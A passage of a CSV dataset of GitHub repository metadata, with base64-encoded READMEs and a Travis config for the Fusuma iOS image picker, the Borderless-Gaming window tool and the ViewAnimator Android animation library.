name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
Z2VTZWxlY3RlZChfIGltYWdlOiBVSUltYWdlLCBzb3VyY2U6IEZ1c3VtYU1v
ZGUpIHsKCiAgcHJpbnQoIkltYWdlIHNlbGVjdGVkIikKfQoKLy8gUmV0dXJu
IHRoZSBpbWFnZSBidXQgY2FsbGVkIGFmdGVyIGlzIGRpc21pc3NlZC4KZnVu
YyBmdXN1bWFEaXNtaXNzZWRXaXRoSW1hZ2UoaW1hZ2U6IFVJSW1hZ2UsIHNv
dXJjZTogRnVzdW1hTW9kZSkgewogICAgICAgIAogIHByaW50KCJDYWxsZWQg
anVzdCBhZnRlciBGdXN1bWFWaWV3Q29udHJvbGxlciBpcyBkaXNtaXNzZWQu
IikKfQoKZnVuYyBmdXN1bWFWaWRlb0NvbXBsZXRlZCh3aXRoRmlsZVVSTCBm
aWxlVVJMOiBVUkwpIHsKCiAgcHJpbnQoIkNhbGxlZCBqdXN0IGFmdGVyIGEg
dmlkZW8gaGFzIGJlZW4gc2VsZWN0ZWQuIikKfQoKLy8gV2hlbiBjYW1lcmEg
cm9sbCBpcyBub3QgYXV0aG9yaXplZCwgdGhpcyBtZXRob2QgaXMgY2FsbGVk
LgpmdW5jIGZ1c3VtYUNhbWVyYVJvbGxVbmF1dGhvcml6ZWQoKSB7CgogIHBy
aW50KCJDYW1lcmEgcm9sbCB1bmF1dGhvcml6ZWQiKQp9CgovLyBSZXR1cm4g
c2VsZWN0ZWQgaW1hZ2VzIHdoZW4geW91IGFsbG93IHRvIHNlbGVjdCBtdWx0
aXBsZSBwaG90b3MuCmZ1bmMgZnVzdW1hTXVsdGlwbGVJbWFnZVNlbGVjdGVk
KF8gaW1hZ2VzOiBbVUlJbWFnZV0sIHNvdXJjZTogRnVzdW1hTW9kZSkgewoK
fQoKLy8gUmV0dXJuIGFuIGltYWdlIGFuZCB0aGUgZGV0YWlsZWQgaW5mb3Jt
YXRpb24uCmZ1bmMgZnVzdW1hSW1hZ2VTZWxlY3RlZChfIGltYWdlOiBVSUlt
YWdlLCBzb3VyY2U6IEZ1c3VtYU1vZGUsIG1ldGFEYXRhOiBJbWFnZU1ldGFk
YXRhKSB7Cgp9CmBgYAoKIyMjIyBIb3cgVG8gQ3VzdG9taXplCgpgYGBTd2lm
dApsZXQgZnVzdW1hID0gRnVzdW1hVmlld0NvbnRyb2xsZXIoKQpmdXN1bWEu
ZGVsZWdhdGUgPSBzZWxmCi8vIC4uLgpmdXN1bWFDYW1lcmFSb2xsVGl0bGUg
PSAiQ3VzdG9taXplQ2FtZXJhUm9sbFRpdGxlIgpmdXN1bWFDYW1lcmFUaXRs
ZSA9ICJDdXN0b21pemVDYW1lcmFUaXRsZSIgLy8gQ2FtZXJhIFRpdGxlCmZ1
c3VtYVRpbnRDb2xvcjogVUlDb2xvciAvLyB0aW50IGNvbG9yCi8vIC4uLgpz
ZWxmLnByZXNlbnQoZnVzdW1hLCBhbmltYXRlZDogdHJ1ZSwgY29tcGxldGlv
bjogbmlsKQoKYGBgCgojIyMgUHJvcGVydGllcwoKfCBQcm9wIHwgVHlwZSB8
IERlc2NyaXB0aW9uIHwgRGVmYXVsdCB8CnwtLS18LS0tfC0tLXwtLS18Cnwq
KmBmdXN1bWFCYXNlVGludENvbG9yIGAqKnxVSUNvbG9yfEJhc2UgdGludCBj
b2xvci58YFVJQ29sb3IuaGV4KCIjYzljN2M4IiwgYWxwaGE6IDEuMClgfAp8
KipgZnVzdW1hVGludENvbG9yIGAqKnxVSUNvbG9yfFRpbnQgY29sb3IufGBV
SUNvbG9yLmhleCgiI0ZDRkNGQyIsIGFscGhhOiAxLjApYHwKfCoqYGZ1c3Vt
YUJhY2tncm91bmRDb2xvciBgKip8VUlDb2xvcnxCYWNrZ3JvdW5kIGNvbG9y
LnxgVUlDb2xvci5oZXgoIiNjOWM3YzgiLCBhbHBoYTogMS4wKWB8CnwqKmBm
dXN1bWFDaGVja0ltYWdlIGAqKnwgVUlJbWFnZSB8IEltYWdlIG9mIGNoZWNr
IGJ1dHRvbi58IVtdKC4vU291cmNlcy9Bc3NldHMueGNhc3NldHMvaWNfY2hl
Y2suaW1hZ2VzZXQvaWNfY2hlY2tfd2hpdGVfNDhwdC5wbmcpfAp8KipgZnVz
dW1hQ2xvc2VJbWFnZSBgKip8IFVJSW1hZ2UgfEltYWdlIG9mIGNsb3NlIGJ1
dHRvbi58IVtdKC4vU291cmNlcy9Bc3NldHMueGNhc3NldHMvaWNfY2xvc2Uu
aW1hZ2VzZXQvaWNfY2xvc2Vfd2hpdGVfNDhwdC5wbmcpfAp8KipgZnVzdW1h
Q3JvcEltYWdlIGAqKnwgQm9vbCB8V2hldGhlciB0byBjcm9wIHRoZSB0YWtl
biBpbWFnZS58IGB0cnVlYCB8CnwqKmBmdXN1bWFTYXZlc0ltYWdlIGAqKnwg
Qm9vbCB8V2hldGhlciB0byBzYXZlIHRoZSB0YWtlbiBpbWFnZS58IGBmYWxz
ZWAgfAp8KipgZnVzdW1hQ2FtZXJhUm9sbFRpdGxlIGAqKnwgU3RyaW5nIHxU
ZXh0IG9mIGNhbWVyYSByb2xsIHRpdGxlLnwgYCJMaWJyYXJ5ImAgfAp8Kipg
ZnVzdW1hQ2FtZXJhVGl0bGUgYCoqfCBTdHJpbmcgfFRleHQgb2YgY2FybWVy
YSB0aXRsZSB0ZXh0LnwgYFBob3RvYCB8CnwqKmBmdXN1bWFWaWRlb1RpdGxl
IGAqKnwgU3RyaW5nIHxUZXh0IG9mIHZpZGVvIHRpdGxlLnwgYFZpZGVvYCB8
CnwqKmBmdXN1bWFUaXRsZUZvbnQgYCoqfCBVSUZvbnQgfEZvbnQgZm9yIHRp
dGxlIHRleHQufCBgVUlGb250KG5hbWU6ICJBdmVuaXJOZXh0LURlbWlCb2xk
Iiwgc2l6ZTogMTUpYCB8CgojIyBGdXN1bWEgZm9yIFhhbWFyaW4KQ2hlZXNl
YmFyb24gZGV2ZWxvcGVkIENoYWZ1IGZvciBYYW1hcmluLiAgCmh0dHBzOi8v
Z2l0aHViLmNvbS9DaGVlc2ViYXJvbi9DaGFmdQoKIyMgQXV0aG9yCnl0YWt6
ayAgCiBbaHR0cHM6Ly95dGFremsubWVdKGh0dHBzOi8veXRha3prLm1lKQog
CiMjIERvbmF0aW9uCllvdXIgc3VwcG9ydCBpcyB3ZWxjb21lIHRocm91Z2gg
Qml0Y29pbiAzUHM4dEJnejRxbjZ6VlVyNUQxd2NZcnJ6WWpNZ0V1Z3F2CiAK
IyMgTGljZW5zZQpGdXN1bWEgaXMgcmVsZWFzZWQgdW5kZXIgdGhlIE1JVCBs
aWNlbnNlLiAgClNlZSBMSUNFTlNFIGZvciBkZXRhaWxzLgo=
",,"bGFuZ3VhZ2U6IG9iamVjdGl2ZS1jCm9zeF9pbWFnZTogeGNvZGUxMC4xCnNj
cmlwdDoKICAtIHNldCAtbyBwaXBlZmFpbAogIC0geGNvZGVidWlsZCAtdmVy
c2lvbgogIC0geGNvZGVidWlsZCAtc2hvd3Nka3MKICAtIHhjb2RlYnVpbGQg
dGVzdCAtd29ya3NwYWNlIEZ1c3VtYS54Y3dvcmtzcGFjZSAtc2NoZW1lIEZ1
c3VtYUV4YW1wbGUgLXNkayBpcGhvbmVzaW11bGF0b3IgLWRlc3RpbmF0aW9u
ICdwbGF0Zm9ybT1pT1MgU2ltdWxhdG9yLG5hbWU9aVBob25lIDgnIE9OTFlf
QUNUSVZFX0FSQ0g9Tk8gYnVpbGQKCiNiZWZvcmVfaW5zdGFsbDoKIyAgLSBi
cmV3IHVwZGF0ZQojICAtIGJyZXcgdW5pbnN0YWxsIHhjdG9vbCAmJiBicmV3
IGluc3RhbGwgLS1IRUFEIHhjdG9vbAo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Borderless-Gaming',15819024,b'Play your favorite games in a borderless window; no more time consuming alt-tabs. ',b'C#',177,2377,,2377,False,b'https://api.github.com/repos/Codeusa/Borderless-Gaming/forks',"IyBbQnV5IGl0IG9uIFN0ZWFtIV0oaHR0cDovL3N0b3JlLnN0ZWFtcG93ZXJl
ZC5jb20vYXBwLzM4ODA4MCkKCiMgV2hhdCBpcyB0aGlzPwoKQm9yZGVybGVz
cyBHYW1pbmcgaXMgYSBzaW1wbGUgdG9vbCB0aGF0IHdpbGwgYWxsb3cgeW91
IHRvIHR1cm4geW91ciB3aW5kb3dlZCB2aWRlbyBnYW1lcyBpbnRvICJmdWxs
c2NyZWVuIiBhcHBsaWNhdGlvbnMgd2l0aG91dCBhbGwgb2YgdGhlIG5lZ2F0
aXZlIHNpZGUgZWZmZWN0cwoKVGhlIHByb2plY3QgaXMgb3BlbiBzb3VyY2Ug
dW5kZXIgdGhlIFtHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSB2Mi4wXSho
dHRwczovL2dpdGh1Yi5jb20vQ29kZXVzYS9Cb3JkZXJsZXNzLUdhbWluZy9i
bG9iL21hc3Rlci9MSUNFTlNFKS4KCgohW0JlZm9yZSBCb3JkZXJsZXNzLUdh
bWluZ10oaHR0cDovL2Nkbi5ha2FtYWkuc3RlYW1zdGF0aWMuY29tL3N0ZWFt
L2FwcHMvMzg4MDgwL3NzX2E1OTlkMjA5NjM4ZThkYjhhZjQzMGI3ZTkwMjhj
NDkwYzNjMjRmNzguMTkyMHgxMDgwLmpwZz90PTE0Mzc2NzI0OTMpCgohW0Fm
dGVyIEJvcmRlcmxlc3MtR2FtaW5nXShodHRwOi8vY2RuLmFrYW1haS5zdGVh
bXN0YXRpYy5jb20vc3RlYW0vYXBwcy8zODgwODAvc3NfM2Y2MjA2ZjIxMWVh
NTczZTYwMTM2NjVmNWJjYTEyNmM2YmE4OTVjZS4xOTIweDEwODAuanBnP3Q9
MTQzNzY3MjQ5MykKCiFbSW1hZ2VdKGh0dHA6Ly9jZG4uYWthbWFpLnN0ZWFt
c3RhdGljLmNvbS9zdGVhbS9hcHBzLzM4ODA4MC9zc18wYmI4Y2FiZTE4MjQ5
YjdmZGMxNjM3NjcyM2UwZmQ2MTEwYmQ3YzRlLjE5MjB4MTA4MC5qcGc/dD0x
NDM3NjcyNDkzKQoKCiMjIEhvdyB0byBpbnN0YWxsIGFuZCBydW4gQm9yZGVy
bGVzcy1HYW1pbmcKCiMjIyMgQnV5IHRocm91Z2ggU3RlYW0gYW5kIHJ1biBp
dApbQ2FuIGJlIHB1cmNoYXNlZCBoZXJlXShodHRwOi8vc3RvcmUuc3RlYW1w
b3dlcmVkLmNvbS9hcHAvMzg4MDgwKS4KCiMjIyMgSW5zdGFsbCBmcm9tIFNv
dXJjZQoKLSBDbG9uZSB3aXRoIHJlcG9zaXRvcnkgCgotIE9wZW4gdGhlIHNv
bHV0aW9uIGluc2lkZSBWaXN1YWwgU3R1ZGlvIDIwMTcKCi0gU2VsZWN0IHRo
ZSAiUmVsZWFzZSIgb3B0aW9uIAoKLSBCdWlsZCB0aGUgcHJvamVjdHMgYW5k
IHVzZSB0aGUgZ2VuZXJhdGVkIGV4ZWN1dGFibGUKCgojIyMjIFVzYWdlCltB
IGRldGFpbGVkIGd1aWRlIGNhbiBiZSBmb3VuZCBoZXJlXShodHRwczovL3N0
ZWFtY29tbXVuaXR5LmNvbS9hcHAvMzg4MDgwL2Rpc2N1c3Npb25zLzAvNTM1
MTUxNTg5ODk5NjU4Nzc4LykuCgojIyMjIE5lZWQgaGVscD8KY29udGFjdCBt
ZSBvbiBteSBbV2Vic2l0ZV0oaHR0cDovL2FuZHJldy5pbSkgCgpvciBpZiB5
b3UncmUgc3VmZmVyaW5nIGZyb20gY3Jhc2hlcyBvciBidWdzIHN1Ym1pdCBp
bmZvcm1hdGlvbiBbaGVyZV0oaHR0cHM6Ly9naXRodWIuY29tL0NvZGV1c2Ev
Qm9yZGVybGVzcy1HYW1pbmcvaXNzdWVzP3N0YXRlPW9wZW4pCgoKIyMgSGVs
cGluZyBCb3JkZXJsZXNzLUdhbWluZyAKCioqSSB3YW50IHRvIGhlbHAgd2l0
aCB0aGUgY29kZToqKiBJIGFjY2VwdCBwdWxsLXJlcXVlc3RzLCBwbGVhc2Ug
c2VlIHRoZSBbQ29udHJpYnV0aW5nIHRvIEJvcmRlcmxlc3MtR2FtaW5nXSho
dHRwczovL2dpdGh1Yi5jb20vQ29kZXVzYS9Cb3JkZXJsZXNzLUdhbWluZy9i
bG9iL21hc3Rlci9DT05UUklCVVRJTkcubWQpIGd1aWRlIGZvciBpbmZvcm1h
dGlvbiBvbiBjb250cmlidXRpbmcgdG8gdGhpcyBwcm9qZWN0LiBBbmQgZG9u
J3QgZm9yZ2V0IHRvIGFkZCB5b3VyIGNvbnRhY3QgaW5mb3JtYXRpb25zIG9u
IHRoZSBBVVRIT1JTIGxpc3QuCgoqKkkgZm91bmQgYSBidWc6KiogRmlsZSBp
dCBhcyBhbiBbaXNzdWVdKGh0dHBzOi8vZ2l0aHViLmNvbS9Db2RldXNhL0Jv
cmRlcmxlc3MtR2FtaW5nL2lzc3VlcykgYW5kIHBsZWFzZSBkZXNjcmliZSBh
cyBtdWNoIGFzIHBvc3NpYmxlIHRoZSBidWcgYW5kIHRoZSBjb250ZXh0LgoK
KipJIGhhdmUgYSBuZXcgc3VnZ2VzdGlvbjoqKiBGb3IgZmVhdHVyZSByZXF1
ZXN0cyBwbGVhc2UgZmlyc3QgY2hlY2sgW3RoZSBpc3N1ZXMgbGlzdF0oaHR0
cHM6Ly9naXRodWIuY29tL0NvZGV1c2EvQm9yZGVybGVzcy1HYW1pbmcvaXNz
dWVzKSB0byBzZWUgaWYgaXQncyBhbHJlYWR5IHRoZXJlLiBJZiBub3QsIGZl
ZWwgZnJlZSB0byBmaWxlIGl0IGFzIGFuIGlzc3VlIGFuZCB0byBkZWZpbmUg
dGhlIGxhYmVsICoqZW5oYW5jZW1lbnQqKi4KCiMjIENvbnRhY3QgaW5mbwoK
KiAqKlR3aXR0ZXI6KiogW0BBbmRyZXdNRDVdKGh0dHBzOi8vdHdpdHRlci5j
b20vYW5kcmV3bWQ1KQoqICoqQmxvZzoqKiBbYmxvZy5hbmRyZXcuaW1dKGh0
dHA6Ly9ibG9nLmFuZHJldy5pbSkKCiMgSm9pbiBvdXIgU3RlYW0gR3JvdXAh
CltCb3JkZXJsZXNzIEdhbWluZyBvbiBTdGVhbV0oaHR0cHM6Ly9zdGVhbWNv
bW11bml0eS5jb20vYXBwLzM4ODA4MC9kaXNjdXNzaW9ucy8pCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'ViewAnimator',48440451,b'A fluent Android animation library',b'Java',21,2377,,2377,False,b'https://api.github.com/repos/florent37/ViewAnimator/forks',"Vmlld0FuaW1hdG9yCj09PT09PT0KClshW0FQSV0oaHR0cHM6Ly9pbWcuc2hp
ZWxkcy5pby9iYWRnZS9BUEktMTElMkItZ3JlZW4uc3ZnKV0oaHR0cHM6Ly9n
aXRodWIuY29tL2Zsb3JlbnQzNy9WaWV3QW5pbWF0b3IvdHJlZS9tYXN0ZXIp
ClshW0FuZHJvaWQgQXJzZW5hbF0oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9i
YWRnZS9BbmRyb2lkJTIwQXJzZW5hbC1WaWV3QW5pbWF0b3ItYnJpZ2h0Z3Jl
ZW4uc3ZnP3N0eWxlPWZsYXQpXShodHRwOi8vYW5kcm9pZC1hcnNlbmFsLmNv
bS9kZXRhaWxzLzEvMjk0MikKCkEgZmx1ZW50IEFuZHJvaWQgYW5pbWF0aW9u
IGxpYnJhcnkgIQoKCjxhIGhyZWY9Imh0dHBzOi8vZ29vLmdsL1dYVzhEYyI+
CiAgPGltZyBhbHQ9IkFuZHJvaWQgYXBwIG9uIEdvb2dsZSBQbGF5IiBzcmM9
Imh0dHBzOi8vZGV2ZWxvcGVyLmFuZHJvaWQuY29tL2ltYWdlcy9icmFuZC9l
bl9hcHBfcmdiX3dvXzQ1LnBuZyIgLz4KPC9hPgoKWyFbcG5nXShodHRwczov
L3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZmxvcmVudDM3L1ZpZXdBbmlt
YXRvci9tYXN0ZXIvbW9udGFpbl9zbWFsbC5qcGcpXShodHRwczovL2dpdGh1
Yi5jb20vZmxvcmVudDM3L1ZpZXdBbmltYXRvcikKCiMgVXNhZ2UKCkFuaW1h
dGUgbXVsdGlwbGUgdmlldyBmcm9tIG9uZSBtZXRob2QKCmBgYGphdmEKVmll
d0FuaW1hdG9yCiAgICAgICAuYW5pbWF0ZShpbWFnZSkKICAgICAgICAgICAg
LnRyYW5zbGF0aW9uWSgtMTAwMCwgMCkKICAgICAgICAgICAgLmFscGhhKDAs
MSkKICAgICAgIC5hbmRBbmltYXRlKHRleHQpCiAgICAgICAgICAgIC5kcCgp
LnRyYW5zbGF0aW9uWCgtMjAsIDApCiAgICAgICAgICAgIC5kZWNlbGVyYXRl
KCkKICAgICAgICAgICAgLmR1cmF0aW9uKDIwMDApCiAgICAgICAudGhlbkFu
aW1hdGUoaW1hZ2UpCiAgICAgICAgICAgIC5zY2FsZSgxZiwgMC41ZiwgMWYp
CiAgICAgICAgICAgIC5hY2NlbGVyYXRlKCkKICAgICAgICAgICAgLmR1cmF0
aW9uKDEwMDApCiAgICAgICAuc3RhcnQoKTsKICAgICAgIApgYGAKClshW2dp
Zl0oaHR0cHM6Ly9qLmdpZnMuY29tL0VSbEJ6Vy5naWYpXShodHRwczovL3lv
dXR1LmJlL1pIdzhNZk9NMUVnKQoKV2l0aG91dCBWaWV3QW5pbWF0b3IKCmBg
YGphdmEKQW5pbWF0b3JTZXQgYW5pbWF0b3JTZXQgPSBuZXcgQW5pbWF0b3JT
ZXQoKTsKYW5pbWF0b3JTZXQucGxheVRvZ2V0aGVyKAogIE9iamVjdEFuaW1h
dG9yLm9mRmxvYXQoaW1hZ2UsInRyYW5zbGF0aW9uWSIsLTEwMDAsMCksCiAg
T2JqZWN0QW5pbWF0b3Iub2ZGbG9hdChpbWFnZSwiYWxwaGEiLDAsMSksCiAg
T2JqZWN0QW5pbWF0b3Iub2ZGbG9hdCh0ZXh0LCJ0cmFuc2xhdGlvblgiLC0y
MDAsMCkKKTsKYW5pbWF0b3JTZXQuc2V0SW50ZXJwb2xhdG9yKG5ldyBEZXNj
ZWxlcmF0ZUludGVycG9sYXRvcigpKTsKYW5pbWF0b3JTZXQuc2V0RHVyYXRp
b24oMjAwMCk7CmFuaW1hdG9yU2V0LmFkZExpc3RlbmVyKG5ldyBBbmltYXRv
ckxpc3RlbmVyQWRhcHRlcigpewogICAgQE92ZXJyaWRlIHB1YmxpYyB2b2lk
IG9uQW5pbWF0aW9uRW5kKEFuaW1hdG9yIGFuaW1hdGlvbikgewoKICAgICAg
QW5pbWF0b3JTZXQgYW5pbWF0b3JTZXQyID0gbmV3IEFuaW1hdG9yU2V0KCk7
CiAgICAgIGFuaW1hdG9yU2V0Mi5wbGF5VG9nZXRoZXIoCiAgICAgICAgICBP
YmplY3RBbmltYXRvci5vZkZsb2F0KGltYWdlLCJzY2FsZVgiLCAxZiwgMC41
ZiwgMWYpLAogICAgICAgICAgT2JqZWN0QW5pbWF0b3Iub2ZGbG9hdChpbWFn
ZSwic2NhbGVZIiwgMWYsIDAuNWYsIDFmKQogICAgICApOwogICAgICBhbmlt
YXRvclNldDIuc2V0SW50ZXJwb2xhdG9yKG5ldyBBY2NlbGVyYXRlSW50ZXJw
b2xhdG9yKCkpOwogICAgICBhbmltYXRvclNldDIuc2V0RHVyYXRpb24oMTAw
MCk7CiAgICAgIGFuaW1hdG9yU2V0Mi5zdGFydCgpOwoKICAgIH0KfSk7CmFu
aW1hdG9yU2V0LnN0YXJ0KCk7CmBgYAoKIyBNb3JlCgpbIVtnaWZdKGh0dHBz
Oi8vai5naWZzLmNvbS9YRDZSNFYuZ2lmKV0oaHR0cHM6Ly95b3V0dS5iZS9R
bGo0MFk2Q2hTTSkKCkFkZCBzYW1lIGFuaW1hdGlvbiBvbiBtdWx0aXBsZXMg
dmlldwpgYGBqYXZhClZpZXdBbmltYXRvcgogICAgICAgLmFuaW1hdGUoaW1h
Z2UsdGV4dCkKICAgICAgIC5zY2FsZSgwLDEpCiAgICAgICAuc3RhcnQoKTsK
YGBgCgpBZGQgbGlzdGVuZXJzCmBgYGphdmEKVmlld0FuaW1hdG9yCiAgICAg
ICAuYW5pbWF0ZShpbWFnZSkKICAgICAgIC5zY2FsZSgwLDEpCiAgICAgICAu
b25TdGFydCgoKSAtPiB7fSkKICAgICAgIC5vblN0b3AoKCkgLT4ge30pCiAg
ICAgICAuc3RhcnQoKTsKCmBgYAoKVXNlIERQIHZhbHVlcwpgYGBqYXZhClZp
ZXdBbmltYXRvcgogICAgICAgLmFuaW1hdGUoaW1hZ2UpCiAgICAgICAuZHAo
KS50cmFuc2xhdGlvblkoLTIwMCwgMCkKICAgICAgIC5zdGFydCgpOwpgYGAK
CkFuaW1hdGUgSGVpZ2h0IC8gV2lkdGgKYGBgamF2YQpWaWV3QW5pbWF0b3IK
ICAgICAgIC5hbmltYXRlKHZpZXcpCiAgICAgICAud2FpdEZvckhlaWdodCgp
IC8vd2FpdCB1bnRpbCBhIFZpZXdUcmVlT2JzZXJ2ZXIgbm90aWZpY2F0aW9u
CiAgICAgICAuZHAoKS53aWR0aCgxMDAsMjAwKQogICAgICAgLmRwKCkuaGVp
Z2h0KDUwLDEwMCkKICAgICAgIC5zdGFydCgpOwpgYGAKCkNvbG9yIGFuaW1h
dGlvbnMKYGBgamF2YQpWaWV3QW5pbWF0b3IKICAgICAgIC5hbmltYXRlKHZp
ZXcpCiAgICAgICAudGV4dENvbG9yKENvbG9yLkJMQUNLLENvbG9yLkdSRUVO
KQogICAgICAgLmJhY2tncm91bmRDb2xvcihDb2xvci5XSElURSxDb2xvci5C
TEFDSykKICAgICAgIC5zdGFydCgpOwpgYGAKClJvdGF0aW9uIGFuaW1hdGlv
bnMKYGBgamF2YQpWaWV3QW5pbWF0b3IKICAgICAgIC5hbmltYXRlKHZpZXcp
CiAgICAgICAucm90YXRpb24oMzYwKQogICAgICAgLnN0YXJ0KCk7CmBgYAoK
Q3VzdG9tIGFuaW1hdGlvbnMKYGBgamF2YQpWaWV3QW5pbWF0b3IKICAgICAg
IC5hbmltYXRlKHRleHQpCiAgICAgICAuY3VzdG9tKG5ldyBBbmltYXRpb25M
aXN0ZW5lci5VcGRhdGU8VGV4dFZpZXc+KCkgewogICAgICAgICAgICBAT3Zl
cnJpZGUgcHVibGljIHZvaWQgdXBkYXRlKFRleHRWaWV3IHZpZXcsIGZsb2F0
IHZhbHVlKSB7CiAgICAgICAgICAgICAgICAgIHZpZXcuc2V0VGV4dChTdHJp
bmcuZm9ybWF0KCIlLjAyZiIsdmFsdWUpKTsKICAgICAgICAgICAgfQogICAg
ICAgIH0sIDAsIDEpCiAgICAgICAuc3RhcnQoKTsKYGBgCgpDYW5jZWwgYW5p
bWF0aW9ucwpgYGBqYXZhClZpZXdBbmltYXRvciB2aWV3QW5pbWF0b3IgPSBW
aWV3QW5pbWF0b3IKICAgICAgIC5hbmltYXRlKHZpZXcpCiAgICAgICAucm90
YXRpb24oMzYwKQogICAgICAgLnN0YXJ0KCk7Cgp2aWV3QW5pbWF0b3IuY2Fu
Y2VsKCk7CmBgYAoKRW5oYW5jZWQgYW5pbWF0aW9ucyAoVGhhbmtzIFtBbmRy
b2lkVmlld0FuaW1hdGlvbnNdKGh0dHBzOi8vZ2l0aHViLmNvbS9kYWltYWpp
YS9BbmRyb2lkVmlld0FuaW1hdGlvbnMpIGFuZCBbTmlmdHlEaWFsb2dFZmZl
Y3RzXShodHRwczovL2dpdGh1Yi5jb20vc2Q2MzUyMDUxL05pZnR5RGlhbG9n
RWZmZWN0cykgKSAgIApgYGBqYXZhCi5zaGFrZSgpLmludGVycG9sYXRvcihu
ZXcgTGluZWFySW50ZXJwb2xhdG9yKCkpOwouYm91bmNlSW4oKS5pbnRlcnBv
bGF0b3IobmV3IEJvdW5jZUludGVycG9sYXRvcigpKTsKLmZsYXNoKCkucmVw
ZWF0Q291bnQoNCk7Ci5mbGlwSG9yaXpvbnRhbCgpOwoud2F2ZSgpLmR1cmF0
aW9uKDUwMDApOwoudGFkYSgpOwoucHVsc2UoKTsKLnN0YW5kVXAoKTsKLnN3
aW5nKCk7Ci53b2JibGUoKTsKYGBgCi4uLgohW1ByZXZpZXddKC9FbmhhbmNl
ZEFuaW1hdGlvbnMuZ2lmKQoKUGF0aCBhbmltYXRpb25zICggSW5zcGlyYXRp
b24gZnJvbSBodHRwOi8vYmxvZy5jc2RuLm5ldC90aWFuamlhbjQ1OTIvYXJ0
aWNsZS9kZXRhaWxzLzQ3MDY3MTYxICkgICAKYGBgamF2YQogICAgZmluYWwg
aW50W10gU1RBUlRfUE9JTlQgPSBuZXcgaW50W117IDMwMCwgMjcwIH07CiAg
ICBmaW5hbCBpbnRbXSBCT1RUT01fUE9JTlQgPSBuZXcgaW50W117IDMwMCwg
NDAwIH07CiAgICBmaW5hbCBpbnRbXSBMRUZUX0NPTlRST0xfUE9JTlQgPSBu
ZXcgaW50W117IDQ1MCwgMjAwIH07CiAgICBmaW5hbCBpbnRbXSBSSUdIVF9D
T05UUk9MX1BPSU5UID0gbmV3IGludFtdeyAxNTAsIDIwMCB9OwogICAgUGF0
aCBwYXRoID0gbmV3IFBhdGgoKTsKICAgIHBhdGgubW92ZVRvKFNUQVJUX1BP
SU5UWzBdLCBTVEFSVF9QT0lOVFsxXSk7CiAgICBwYXRoLnF1YWRUbyhSSUdI
VF9DT05UUk9MX1BPSU5UWzBdLCBSSUdIVF9DT05UUk9MX1BPSU5UWzFdLCBC
